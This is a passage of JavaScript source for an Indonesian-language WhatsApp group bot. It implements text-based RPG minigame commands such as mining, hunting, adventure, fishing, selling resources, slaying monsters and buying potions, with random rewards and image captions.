  var emasnya = emas[Math.floor(Math.random() * emas.length)]
  var emeraldnya = emerald[Math.floor(Math.random() * emerald.length)]
  setTimeout( async () => {
    let caption = `\n*🎁 HASIL MINING*\n\n◻ *Iron :* ${besinya}\n🌟 *Gold :* ${emasnya}\n*🐲 Emerald :* ${emeraldnya}\n*Blood Remaining:* ${getDarah(m.sender) ? getDarah(m.sender) : 0}`
    await rezzx.sendMessage(m.chat, {image:{ url : 'https://telegra.ph/file/ad9653f72d2559c07c9aa.png'}, caption: caption}, {quoted: m})
  }, 7000)
  setTimeout( async () => {
    await rezzx.sendTextWithMentions(m.chat, `_@${m.sender.split("@")[0]} Melakukan Mining_`, m) 
  }, 1500)
  kurangDarah(m.sender, 10)
  addBesi(m.sender, besinya)
  addEmas(m.sender, emasnya)
  addEmerald(m.sender, emeraldnya) 
}
break

 case 'heal':{ 
  if (isBan) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isPetualang) return m.reply(mess.rpg)
  if (!isCekDarah < 1) return m.reply('_Anda Hanya Dapat Menyembuhkan Saat Darah Anda 0_')
  if (isCekDarah > 100) return m.reply('_Darahmu Penuh_')
  if (isPotion < 1) return m.reply(`_Anda Tidak Punya Ramuan, Coba Beli Dengan Cara buypotion_`) 
  addDarah(m.sender, 100)
  kurangPotion(m.sender, 1)
  m.reply('_Done!!, Darah mu sudah full_')
 }
 break
 
case 'hunt': case 'hunting': { 
  if (isBan) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isPetualang) return m.reply(mess.rpg)
  if (isCekDarah < 1) return m.reply('_Darahmu Habis, Coba Sembuhkan Menggunakan Ramuan (heal)_') 
  let luka = ["Tertusuk Kayu Saat Berburu","Tergelincir ke dalam jurang saat berburu","Dicakar oleh binatang buas","tidak hati-hati","Terjerat dalam akar","Jatuh saat berburu"]
  let location = ["Jungle","Amazon forest","Tropical forest","Meadow","African forest","Mountains"]
  var ikanmu = Math.ceil(Math.random() * 10)
  var ayam = Math.ceil(Math.random() * 8)
  var kelinci = Math.ceil(Math.random() * 7)
  var dombanya = [3,0,4,0,5,4,6,0,1,0,2,3,0,3,0,1]
  var sapinya = [2,0,3,0,4,0,5,0,1,0,2,0,3,0,1]
  var gajahnya = [1,0,4,0,2,0,1,0,2,1,3,0,1]
  var domba = dombanya[Math.floor(Math.random() * dombanya.length)] 
  var sapi = sapinya[Math.floor(Math.random() * sapinya.length)] 
  var gajah = gajahnya[Math.floor(Math.random() * gajahnya.length)]
  var lukanya = luka[Math.floor(Math.random() * luka.length)]
  var lokasinya = location[Math.floor(Math.random() * location.length)]
  if (lokasinya === 'Jungle') {
    var image = 'https://telegra.ph/file/08d114af57af0e8009aa1.png'
  } else
  if (lokasinya === 'Amazon forest') {
    var image = 'https://telegra.ph/file/08d114af57af0e8009aa1.png'
  } else
  if (lokasinya === 'Tropical forest') {
    var image = 'https://telegra.ph/file/08d114af57af0e8009aa1.png'
  } else
  if (lokasinya === 'Meadow') {
    var image = 'https://telegra.ph/file/08d114af57af0e8009aa1.png'
  } else
  if (lokasinya === 'African forest') {
    var image = 'https://telegra.ph/file/08d114af57af0e8009aa1.png'
  } else
  if (lokasinya === 'Mountains') {
    var image = 'https://telegra.ph/file/08d114af57af0e8009aa1.png'
  }
  setTimeout( async () => {
    let teksehmazeh = `🎁 *HASIL BERBURU*\n\n`
    teksehmazeh += `*🐟Fish :* ${ikanmu}\n`
    teksehmazeh += `*🐔Chicken :* ${ayam}\n`
    teksehmazeh += `*🐇Rabbit :* ${kelinci}\n`
    teksehmazeh += `*🐑Sheep :* ${domba}\n`
    teksehmazeh += `*🐄Cow :* ${sapi}\n`
    teksehmazeh += `*🐘Elephant :* ${gajah}\n\n`
    teksehmazeh += `*INFO*\n`
    teksehmazeh += `*Lokasi :* ${lokasinya}\n`
    teksehmazeh += `*Kejadian :* ${lukanya}, Darah - 10\n`
    teksehmazeh += `*Darah Tersisa :* ${getDarah(m.sender)}\n`
    await rezzx.sendMessage(m.chat, {image:{ url: image }, caption: teksehmazeh}, {quoted: m})
  }, 5000)
  setTimeout( () => {
    rezzx.sendTextWithMentions(m.chat, `@${m.sender.split("@")[0]} Memulai Berburu Di ${lokasinya}`, m) 
  }, 1000) 
  addIkan(m.sender, ikanmu) 
  addAyam(m.sender, ayam) 
  addKelinci(m.sender, kelinci)
  addDomba(m.sender, domba)
  addSapi(m.sender, sapi)
  addGajah(m.sender, gajah)
  kurangDarah(m.sender, 10)
}
break
 
case 'adventure':{ 
  if (isBan) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isPetualang) return m.reply(mess.rpg)
  ngab = ['Avalanche','Volcanic Eruption','Tsunami','Earthquake','Meteor','Demon']
  var sesuatu = ngab[Math.floor(Math.random() * ngab.length)]
  var dungeon =['Whetstone','Willow Field','Rodeo','Verdant Blufs','Bull Holland','Fallen Tree','Dellnort','Verona Lush','Leafy Hollow','Chilliad Dome','Garcia','Pine Valley','Santa Florals','Guvero East','Cranbarry','Junever','Aldea Malvada','Green Palms','Green Oasis','Fort Carson','Prickel Pine','Pilson Meadow','Boca Roca','Rocksore East','Camel Toe','Hanky Panky','Fern Ridge','Montgomerry','Flint Yankton','Vespucci','fortress city', 'ravines valley', 'horizon valley', 'cyber city', 'end city', 'templar city', 'pochinki', 'peak','Vertical Zone','Sentainel Country','Night City','Flush City','Royals Canyon','Blackburn','Peterborough','Tarnstead','Jarren’s','Outpost','Landow','Nearon','Kincardine','Aysgarth','Veritas','Openshaw','Bredwardine','Berkton','Wolford','Norwich','Kald','Solaris','Kilead','Pitmerden','Acomb','Eldham','Warcester','Lingmell','Kilead','Cromerth','Wingston','Garmsby','Kingcardine','Perthlochry','Frostford','Hillford','Hardersfield','Tarrin','Holmfirth','Caerleon','Elisyum','Ballaeter','Penshaw','Bradford','Wigston','Accreton','Kameeraska','Ferncombe','Kilerth','Erostey','Carran','Jongvale','Larnwick','Queenstown','Whaelrdrake','Baerney','Wingston','Arkney','Strongfair','Lowestoft','Beggar’s Hole','Shepshed','Perthlochry','Ironforge','Tywardreath','Pontheugh','Foolshope','Hull','Dalmerlington','Aucteraden','Woodpine','Millstone','Windermere','Lancaster','Kirkwall','Rotherhithe','Astrakhan','Watford','Ritherhithe','Krosstoen','Pella’s','Wish','Grimsby','Ayrith','Ampleforth','Skystead','Eanverness','Penshaw','Peatsland','Astrakane','Pontybridge','Caershire','Snowbush','Sutton','Northwich','Hogsfeet','Claethorpes','Sudbury','Cherrytown','Blue Field','Orrinshire','Aempleforth','Garrigill','Jedburgh','Eastbourne','Taedmorden','Venzor','Grasmere','Ubbin','Falls','Violl’s Garden','Glanchester','Bailymena','Arkkukari','Skargness','Cardend','Llanybydder','Faversham','Yellowseed','Carlisle','Cirencester','Aramoor','Furness','Kincardine','Rotherham','Emelle','Boroughton','Carran','Ffestiniog','Mansfield','Huthwaite','Marclesfield','Pavv','Squall’s End','Glenarm','Dragontail','Moressley','Hardersfield','Gilramore','Aria','Ecrin','Clare View Point','Blackburn','Oakheart','Doonatel','Broughton','Carlisle','Murlayfield','Nuxvar']
  var sesuatuu = dungeon[Math.floor(Math.random() * dungeon.length)]
  hasm = "https://telegra.ph/file/fe0e2b958bdc1596f7e9e.png"
  var adven = Math.ceil(Math.random() * 1000)
  var money = Math.ceil(Math.random() * 300)
  setTimeout( () => {
    var hg = `\n🎁 *HASIL ADVENTURE*\n\n*Lokasi :* ${sesuatuu}\n*MONEY :* $${money}\n*EXP :* ${adven}Xp`
    rezzx.sendMessage(m.chat, {image:{url:hasm}, caption: hg},{quoted:m})
  }, 9000)
  setTimeout( () => {
    m.reply('Adventure Selesai..')
  }, 7000)
  setTimeout( () => {
    m.reply(`Selamatkan Dirimu!!`)
  }, 5000) // 1000 = 1s,
  setTimeout( () => {
    m.reply(`Mendadak Ada ${sesuatu}`)
  }, 3000) // 1000 = 1s,
  setTimeout( () => {
    m.reply(`${pushname} Memulai Adventure`)
  }, 0) // 1000 = 1s,
  addLevelingXp(m.sender, adven)
  addBalance(m.sender, money, balance)
}
break

case 'ojek': case 'ngojek':{ 
  if (isBan) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isPetualang) return m.reply(mess.rpg)
  var adven = Math.ceil(Math.random() * 1000)
  var money = Math.ceil(Math.random() * 300)
  setTimeout( () => {
    var hg = `📝 *Hasil Ngojek ${pushname}*,\n\n💹 *Uang :* $${money}\n✨ *Exp :* ${adven}Xp\n😍 *Orderan :* +1`
    m.reply(hg)
  }, 10000)
  setTimeout( () => {
    m.reply(`Menerima Upah...`)
  }, 9000)
  setTimeout( () => {
    m.reply(`⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛\n⬛⬜⬜⬛⬛⬜⬜⬜⬛⬛\n⬛⬛⬛⬛⬛⬛⬛🛵⬛⬛\n🏘️🏘️🏘️🏘️🌳  🌳 🏘️\n\nSampai Di Tujuan...`)
  }, 7000)
  setTimeout( () => {
    m.reply(`🚶🛵⬛⬛⬛⬛⬛⬛⬛⬛\n⬛⬜⬜⬜⬛⬜⬜⬜⬛⬛\n⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛\n🏘️🏘️🏘️🏘️🌳  🌳 🏘️       \nMengantar Ke Tujuan....`)
  }, 5000) // 1000 = 1s,
  setTimeout( () => {
    m.reply(`Mendapatkan Orderan...`)
  }, 3000) // 1000 = 1s,
  setTimeout( () => {
    m.reply(`Menunggu Pelanggan...`)
  }, 0) // 1000 = 1s,
  addLevelingXp(m.sender, adven)
  addBalance(m.sender, money, balance)
}
break

case 'jualikan':{ 
  if (isBan) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isPetualang) return m.reply(mess.rpg)
  if (args.length < 1) return m.reply(`Contoh : *${prefix + command}* 10`)
  jmlh = text
  rp = 5 * jmlh
  if (getFish(m.sender) < jmlh) return m.reply(`*Ikan Anda Tidak Cukup*`)
  sellFish(m.sender, jmlh, balance)
  addBalance(m.sender, rp, balance) 
  m.reply(`🛍️ *MARKET*\n\n*Seller :* ${pushname}\n*Buyer :* rezzx\n*Harga/Fish :* 5\n*Status :* Success\n*Sisa Ikan :* ${await getFish(m.sender)}\n*Total Jual :* $${rp}`)
}
break

case 'jualbesi':{ 
  if (isBan) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isPetualang) return m.reply(mess.rpg)
  if (args.length < 1) return m.reply(`Contoh : *${prefix + command}* 10`)
  jmlh = text
  rp = 10 * jmlh
  if (getBesi(m.sender) < jmlh) return m.reply(`*Besi Anda Tidak Cukup*`)
  sellBesi(m.sender, jmlh, balance)
  addBalance(m.sender, rp, balance) 
  m.reply(`🛍️ *MARKET*\n*Seller :* ${pushname}\n*Buyer :* rezzx\n*Harga/Besi :* 10\n*Status :* Sukses\n*Sisa Besi :* ${await getBesi(m.sender)}\n*Total Jual :* $${rp}`)
}
break

case 'jualemas':{ 
  if (isBan) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isPetualang) return m.reply(mess.rpg)
  if (args.length < 1) return m.reply(`Kirim perintah *${prefix + command}* jumlah untuk dijual\n\nContoh *${prefix + command}* 10`)
  jmlh = text
  rp = 25 * jmlh
  if (getEmas(m.sender) < jmlh) return m.reply(`*Emas Anda Tidak Cukup*`)
  sellEmas(m.sender, jmlh, balance)
  addBalance(m.sender, rp, balance) 
  m.reply(`🛍️ *MARKET*\n*Seller :* ${pushname}\n*Buyer :* rezzx\n*Harga/Emas :* 25\n*Status :* Sukses\n*Sisa Emas :* ${getEmas(m.sender)}\n*Total Jual :* $${rp}`)
}
break

case 'jelajah': { 
  if (isBan) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isPetualang) return m.reply(mess.rpg)
  var tempsa = args.join(" ")
  if (tempsa == 'corbiens river') {
    var asu = `https://telegra.ph/file/00018dab77a6cea81523e.jpg`
    setTimeout( async () => {
      const vio = Math.ceil(Math.random() * 70) 
      const pikan = Math.ceil(Math.random() * 15)
      addBatu(m.sender, vio, balance)
      addIkan(m.sender, pikan, balance)
      rezzx.sendMessage(m.chat, {image:{url: asu}, caption: `*Congratulation 🎊*${enter}${enter}Kamu mendapatkan *${vio}* batu dan *${pikan}* ikan${enter}${enter}Cek inventory anda dengan cara ketik ${prefix}inventory`}, {quoted:m})
    }, 2000); //2 minute
    setTimeout( () => {
      m.reply('Sedang berpetualang, silahkan tunggu...')
    }, 0) 
  } else if (tempsa === 'chiltawa woods') {
      let gos = `https://telegra.ph/file/77c3badc9f97d6589a30f.jpg`
      setTimeout( async () => {
        const tesaaq = Math.ceil(Math.random() * 110) // batu
        const ise = Math.ceil(Math.random() * 20)
        addBatu(m.sender, tesaaq)
        addKayu(m.sender, ise)
        rezzx.sendMessage(m.chat, {image:{url:gos},caption: `*Congratulation 🎊*${enter}${enter}Kamu mendapatkan *${tesaaq}* batu dan *${ise}* kayu${enter}${enter}Cek inventory anda dengan cara ketik ${prefix}inventory`}, {quoted:m})
      }, 2000); //2 minute
      setTimeout( () => {
        m.reply('Sedang berpetualang, silahkan tunggu...')
      }, 0) //1sec
  } else if (tempsa === 'cochher sea') { 
      let seae = `https://telegra.ph/file/eabfc907cfc447386b0c0.jpg`
      setTimeout( async () => {
        const feds = Math.ceil(Math.random() * 65)
        addIkan(m.sender, feds)
        rezzx.sendMessage(m.chat, {image:{url: seae},caption: `*Congratulation 🎊*${enter}${enter}Kamu mendapatkan *${feds}* ikan${enter}${enter}Cek inventory anda dengan cara ketik ${prefix}inventory`}, {quoted:m})
      }, 2000); //2 minute
      setTimeout( () => {
        m.reply('Sedang berpetualang, silahkan tunggu...')
      }, 0) //1sec
  } else if (tempsa === 'limingstall mountains') {
      let seoe = `https://telegra.ph/file/19a10ff95c31af10267e4.jpg`
      setTimeout(() => {
        const fads = Math.ceil(Math.random() * 50)
        const fids = Math.ceil(Math.random() * 80)
        addOre(m.sender, fads)
        addBatu(m.sender, fids)
        rezzx.sendMessage(m.chat, {image:{url:seoe}, caption: `*Congratulation 🎊*${enter}${enter}Kamu mendapatkan *${fads}* copper ore dan ${fids} batu${enter}${enter}Cek inventory anda dengan cara ketik ${prefix}inventory`},{quoted:m})
      }, 2000); //2 minute
      setTimeout( () => {
         m.reply('Sedang berpetualang, silahkan tunggu...')
      }, 0) //1sec
  } else if (tempsa === 'chade mountain') {
      let seye = `https://telegra.ph/file/efdcd7d07dd22294695a8.jpg`
      setTimeout( () => {
        const pore = Math.ceil(Math.random() * 40)
        const pone = Math.ceil(Math.random() * 60)
        addOre(m.sender, pore)
        addBatu(m.sender, pone)
        rezzx.sendMessage(m.chat, {image:{url:seye}, caption: `*Congratulation 🎊*${enter}${enter}Kamu mendapatkan *${pore}* copper ore dan ${pone} batu${enter}${enter}Cek inventory anda dengan cara ketik ${prefix}inventory`},{quoted:m})
      }, 3000); //2 minute
      setTimeout( () => {
        m.reply('Sedang berpetualang, silahkan tunggu...')
      }, 0) //1sec
  } else if (tempsa === 'gerbil woods') {
      let siae = `https://telegra.ph/file/44fc684be9865c0fcb5fa.jpg`
      setTimeout( async () => {
        const tzys = Math.ceil(Math.random() * 90) // batu
        const isue = Math.ceil(Math.random() * 45)
        addBatu(m.sender, tzys)
        addKayu(m.sender, isue)
        rezzx.sendMessage(m.chat, {image:{url:siae}, caption: `*Congratulation 🎊*${enter}${enter}Kamu mendapatkan *${tzys}* batu dan *${isue}* kayu${enter}${enter}Cek inventory anda dengan cara ketik ${prefix}inventory`},{quoted:m})
      }, 2000); //2 minute
      setTimeout( () => {
        m.reply('Sedang berpetualang, silahkan tunggu...')
      }, 0) //1sec
  } else if (tempsa === 'moobiens grassland') {
      let bbbb = `https://telegra.ph/file/0c3fa86f57a4f6d9c4c0e.jpg`
      setTimeout( () => {
        const awqu = Math.ceil(Math.random() * 200) // batu
        const usui = Math.ceil(Math.random() * 20)
        addBatu(m.sender, awqu)
        addKayu(m.sender, usui)
        rezzx.sendMessage(m.chat, {image:{url:bbbb}, caption: `*Congratulation 🎊*${enter}${enter}Kamu mendapatkan *${awqu}* batu dan ${usui} kayu${enter}${enter}Cek inventory anda dengan cara ketik ${prefix}inventory`} ,{quoted:m})
      }, 2000); //2 minute
      setTimeout( () => {
        m.reply('Sedang berpetualang, silahkan tunggu...')
      }, 0) //1sec
  } else {
      let seae = await getBuffer(`https://telegra.ph/file/16857796fab2ccb6cffc2.jpg`)
      tesk = `*PILIH WILAYAH YANG INGIN KAMU JELAJAHI*


⚪ Corbiens River
🔵 Cochher Sea
⚫ Moobiens Grassland
🟣 Gerbil Woods
🟢 Chiltawa Woods
🟠 Limingstall Mountains
🔴 Chade Mountain

Example :
- ${prefix}jelajah corbiens river`
    rezzx.sendMessage(m.chat, { image: seae, caption: tesk}, {quoted: m}) 
  }
}
break

case 'mancing': { 
  if (isBan) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isPetualang) return m.reply(mess.rpg)
  setTimeout( () => {
    const fishing = Math.ceil(Math.random() * 10)
    addIkan(m.sender, fishing)
    m.reply(`*Selamat 🎊*\nkamu mendapatkan *${fishing}* Ikan selama 2 menit`)
  }, 7000); //2 minute
  setTimeout( () => {
    m.reply('Berhasil Mendapatkan Ikan . . .' )
  }, 5000) // 1000 = 1s,
  setTimeout( () => {
    m.reply('🎣 Menarik Kail. . .' )
  }, 3000) // 1000 = 1s,
  setTimeout( () => {
    m.reply('🎣 Mulai Memancing . . .')
  }, 0) // 1000 = 1s,
}
break

case 'jualcoal':{ 
  if (isBan) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isPetualang) return m.reply(mess.rpg)
  if (!text) return m.reply(`Contoh : *${prefix + command}* 10`)
  bayar = args.join(' ')
  const hargaCoal = 15000
  const hasil2 = bayar * hargaCoal
  if ( getMiningcoal(m.sender) <= 1 ) return m.reply(`*Coal Anda Tidak Cukup"`)
  if ( getMiningcoal(m.sender) >= 1 ) {
    jualcoal(m.sender, bayar)
    addKoinUser(m.sender, hasil2)
    await m.reply(`*PENJUALAN BERHASIL*${enter}\n*Jumlah Coal dijual:* ${bayar}${enter}*Uang didapat:* ${hasil2}${enter}${enter}*Sisa coal:* ${getMiningcoal(m.sender)}${enter}*Sisa uang:* ${checkATMuser(m.sender)}`)
  }
}
break

case 'lebur':{ 
  if (isBan) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isPetualang) return m.reply(mess.rpg)
  if (!text) return m.reply(`Contoh : *${prefix + command}* 10`)
  bayar = args.join(' ')
  const hargaOre = 2000
  const hasil3 = bayar * hargaOre
  if ( getMiningore(m.sender) <= 1 ) return m.reply(`*Ore Anda Tidak Cukup*`)
  if ( getMiningore(m.sender) >= 1 ) {
    jualore(m.sender, bayar)
    addIngot(m.sender, hasil3)
    await m.reply(`*LEBUR BERHASL*\n\n*Jumlah Ore dilebur :* ${bayar}\n*Ingot didapat:* ${hasil3}\n\n*Sisa Ore:* ${getMiningore(m.sender)}`)
  }
}
break

case 'jualstone':{ 
  if (isBan) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isPetualang) return m.reply(mess.rpg)
  if (!text) return m.reply(`Contoh : *${prefix + command}* 10`)
  bayar = args.join(' ')
  const hargaStone = 900
  const hasil4 = bayar * hargaStone
  if ( getMiningstone(m.sender) <= 1 ) return m.reply(`*Stone Anda Tidak Cukup*`)
  if ( getMiningstone(m.sender) >= 1 ) {
    jualstone(m.sender, bayar)
    addKoinUser(m.sender, hasil4)
    await m.reply(`*PENJUALAN BERHASIL*${enter}\n*Jumlah Batu dijual:* ${bayar}${enter}*Uang didapat:* ${hasil4}${enter}${enter}*Sisa Batu:* ${getMiningstone(m.sender)}${enter}*Sisa uang:* ${checkATMuser(m.sender)}`)
  }
}
break

case 'jualingot':{ 
  if (isBan) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isPetualang) return m.reply(mess.rpg)
  if (!text) return m.reply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10`)
  bayar = args.join(' ')
  const hargaIngot = 35000
  const hasil5 = bayar * hargaIngot
  if ( getMiningingot(m.sender) <= 1 ) return m.reply(`Maaf ${pushname} ingot kamu belum cukup, minimal 2 ingot`)
  if ( getMiningingot(m.sender) >= 1 ) {
    jualingot(m.sender, bayar)
    addKoinUser(m.sender, hasil5)
    await m.reply(`*PENJUALAN BERHASIL*${enter}\n*Jumlah Ingot dijual:* ${bayar}${enter}*Uang didapat:* ${hasil5}${enter}${enter}*Sisa Ingot:* ${getMiningingot(m.sender)}${enter}*Sisa uang:* ${checkATMuser(m.sender)}`)
  }
}
break

case 'jualkayu':{ 
  if (isBan) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isPetualang) return m.reply(mess.rpg)
  if (!text) return m.reply(`Contoh : *${prefix + command}* 10`)
  bayar = args.join(' ')
  const hargaKayu = 18000
  const hasil6 = bayar * hargaKayu
  if ( getNebangKayu(m.sender) <= 1 ) return m.reply(`*Kayu Anda Tidak Cukup*`)
  if ( getNebangKayu(m.sender) >= 1 ) {
    jualKayu(m.sender, bayar)
    addKoinUser(m.sender, hasil6)
    await m.reply(`*PENJUALAN BERHASIL*${enter}\n*Jumlah Kayu dijual:* ${bayar}${enter}*Uang didapat:* ${hasil6}${enter}${enter}*Sisa Kayu :* ${await getNebangKayu(m.sender)}${enter}*Sisa uang:* ${await checkATMuser(m.sender)}`)
  }
}
break

case 'nebang':{
  if (isBan) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isPetualang) return m.reply(mess.rpg)
  setTimeout( () => {
    const oreo = Math.ceil(Math.random() * 20)
    addKayu(m.sender, oreo)
    m.reply(`*Selamat 🎊*${enter}\nkamu mendapatkan *${oreo}* kayu selama 2 menit`)
  }, 4000); //2 minute
  setTimeout( () => {
    m.reply('Sedang menebang, silahkan tunggu...')
  }, 0) //1sec
}
break

case 'goplanet':{
  if (isBan) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isPetualang) return m.reply(mess.rpg)
  setTimeout( () => {
    const bertualang = Math.ceil(Math.random() * 100)
    const goplanet =['merkurius','venus','mars','jupiter','saturnus','neptunus','uranus']
    const planetari = goplanet[Math.floor(Math.random() * goplanet.length)]
    addPlanet(m.sender, bertualang)
    m.reply(`*Selamat 🎊*${enter}${enter}kamu mendapatkan *${bertualang}* bahan kimia dar planeti *${planetari}* selama 2 tahun`)
  }, 2000); //2 minute
  setTimeout( () => {
    m.reply('Roketmu Sedang Meluncur.., silahkan tunggu... 2 tahun')
  }, 0) //1sec
}
break

case 'jualbahankimia':{ 
  if (isBan) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isPetualang) return m.reply(mess.rpg)
  if (!text) return m.reply(`Contoh : *${prefix + command}* 10`)
  buayar= args.join(" ")
  const hargakimia = 1000
  const dapetin = buayar * hargakimia
  if ( getBertualangPlanet(m.sender) <= 1 ) return m.reply(`*Bahankimia Anda Tidak Cukup*`)
  if ( getBertualangPlanet(m.sender) >= 1 ) {
    jualbahankimia(m.sender, buayar)
    addKoinUser(m.sender, dapetin)
    await m.reply(`*PENJUALAN BERHASIL*${enter}${enter}*Jumlah bahankimia dijual:* ${buayar}${enter}*Uang didapat:* ${dapetin}${enter}${enter}*Sisa bahankimia:* ${getBertualangPlanet(m.sender)}${enter}*Sisa uang:* ${checkATMuser(m.sender)}${enter}${enter}`)
  }
}
break

//butuh random nomor
case 'luckyday': case 'luckytime':{
  if (isBan) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isPetualang) return m.reply(mess.rpg)
  ez = Math.ceil(Math.random() * 450)
  a = randomNomor(99)
  b = randomNomor(500)
  c = randomNomor(150)
  addBalance(m.sender, b, balance)
  addLevelingXp(m.sender, ez)
  addEmas(m.sender, a)
  addBesi(m.sender, c)
  m.reply(`🎰 *Lucky Day*\n*Money:* $${b}\n*Gold :* ${a}\n*Iron :* ${c}\n*XP :* ${ez}Xp`)
}
break

case 'slime': case 'killslime':{ 
  if (isBan) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isPetualang) return m.reply(mess.rpg)
  ez = Math.ceil(Math.random() * 400)
  addLevelingXp(m.sender, ez)
  a = randomNomor(55)
  b = randomNomor(400)
  c = randomNomor(80)
  d = randomNomor(3)
  addLevelingXp(m.sender, ez)
  addBalance(m.sender, b, balance)
  addEmas(m.sender, a)
  addBesi(m.sender, c)
  addDm(m.sender, d)
  bufutI = "https://telegra.ph/file/e3d95cfbd6de3eb5cda55.png"
  var hg = `*Misi kill Slime*\n\n⏫ *Hadiah untuk killing Slime*\n*Money:* $${b}\n*Iron:* ${c}\n*Gold:* ${a}\n*Diamond:* ${d}\n`
  rezzx.sendMessage(m.chat, {image:{url:bufutI},caption: hg} , {quoted:m}) 
}
break

case 'goblin': case 'killgoblin':{ 
  if (isBan) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isPetualang) return m.reply(mess.rpg)
  ez = Math.ceil(Math.random() * 500)
  addLevelingXp(m.sender, ez)
  a = randomNomor(65)
  b = randomNomor(500)
  c = randomNomor(90)
  d = randomNomor(5)
  addLevelingXp(m.sender, ez)
  addBalance(m.sender, b, balance)
  addEmas(m.sender, a)
  addBesi(m.sender, c)
  addDm(m.sender, d)
  bufo = "https://telegra.ph/file/e3d95cfbd6de3eb5cda55.png"
  var hg = `*Misi kill Goblin*\n\n⏫ *Hadiah untuk killing Goblin*\n*Money:* $${b}\n*Iron:* ${c}\n*Gold:* ${a}\n*Diamond:* ${d}\n`
  rezzx.sendMessage(m.chat, {image:{url:bufo}, caption: hg }, {quoted:m})
}
break

case 'devil': case 'killdevil':{ 
  if (isBan) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isPetualang) return m.reply(mess.rpg)
  ez = Math.ceil(Math.random() * 600)
  addLevelingXp(m.sender, ez)
  a = randomNomor(70)
  b = randomNomor(600)
  c = randomNomor(95)
  d = randomNomor(6)
  addLevelingXp(m.sender, ez)
  addBalance(m.sender, b, balance)
  addEmas(m.sender, a)
  addBesi(m.sender, c)
  addDm(m.sender, d)
  bufas = "https://telegra.ph/file/e3d95cfbd6de3eb5cda55.png"
  var hg = `*Misi kill Devil*\n\n⏫ *Hadiah untuk killing Devil*\n*Money:* $${b}\n*Iron:* ${c}\n*Gold:* ${a}\n*Diamond:* ${d}\n`
  rezzx.sendMessage(m.chat, {image:{url: bufas}, caption: hg }, {quoted:m})
}
break

case 'orc': case 'killorc':{ 
  if (isBan) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isPetualang) return m.reply(mess.rpg)
  ez = Math.ceil(Math.random() * 700)
  addLevelingXp(m.sender, ez)
  a = randomNomor(75)
  b = randomNomor(600)
  c = randomNomor(100)
  d = randomNomor(7)
  addLevelingXp(m.sender, ez)
  addBalance(m.sender, b, balance)
  addEmas(m.sender, a)
  addBesi(m.sender, c)
  addDm(m.sender, d)
  batai = "https://telegra.ph/file/e3d95cfbd6de3eb5cda55.png"
  var hg = `*Misi kill Orc*\n\n⏫ *Hadiah untuk kiling Orc*\n*Money:* $${b}\n*Iron:* ${c}\n*Gold:* ${a}\n*Diamond:* ${d}\n`
  rezzx.sendMessage(m.chat, {image:{url: batai}, caption: hg }, {quoted:m})
}
break

case 'demon': case 'killdemon':{ 
  if (isBan) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isPetualang) return m.reply(mess.rpg)
  ez = Math.ceil(Math.random() * 850)
  addLevelingXp(m.sender, ez)
  a = randomNomor(90)
  b = randomNomor(900)
  c = randomNomor(120)
  d = randomNomor(10)
  addLevelingXp(m.sender, ez)
  addBalance(m.sender, b, balance)
  addEmas(m.sender, a)
  addBesi(m.sender, c)
  addDm(m.sender, d)
  bhuu = "https://telegra.ph/file/e3d95cfbd6de3eb5cda55.png"
  var hg = `*Misi kill Demon*\n⏫ *Demon Kill Reward*\n*Money:* $${b}\n*Iron:* ${c}\n*Gold*: ${a}\n*Diamond:* ${d}\n`
  rezzx.sendMessage(m.chat, {image: {url: bhuu}, caption: hg }, {quoted:m})
}
break

case 'beli': case 'buy':{ 
  if (isBan) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isPetualang) return m.reply(mess.rpg)
if (!text) return m.reply(`Mau buy apa lu?\n\n1.potion\n2.baitfood\n\nExample: ${prefix + command} baitfood`)
var gambarnya = args[1]
if (args[0] === 'potion'){
let noh = 100000 * gambarnya
 if (!args[1]) return m.reply(`Contoh : ${prefix + command} potion 2\n 1 Potion = 100000 Money`)
 if (isMonay < noh) return m.reply('Sisa Uang Anda Tidak Cukup Untuk Pembelian Ini')
 kurangBalance(m.sender, noh, balance)
 var apalu = gambarnya * 1
 addPotion(m.sender, apalu)
setTimeout( async () => {
m.reply(`Transaksi Berhasil ✅\n*Sisa uang* : ${getBalance(m.sender, balance)}\n*Potion* : ${getPotion(m.sender)}`)
}, 2000) 
 } else 
 if (args[0] === 'baitfood'){
let noh = 5000 * gambarnya
 if (!args[1]) return m.reply(`Contoh : ${prefix + command} baitfood 2\n 1 Bait Food = 2500 Money`)
 if (isMonay < noh) return m.reply('Sisa Uang Anda Tidak Cukup Untuk Pembelian Ini')
 kurangBalance(m.sender, noh, balance)
 var apalu = gambarnya * 1
 addUmpan(m.sender, apalu)
setTimeout( async () => {
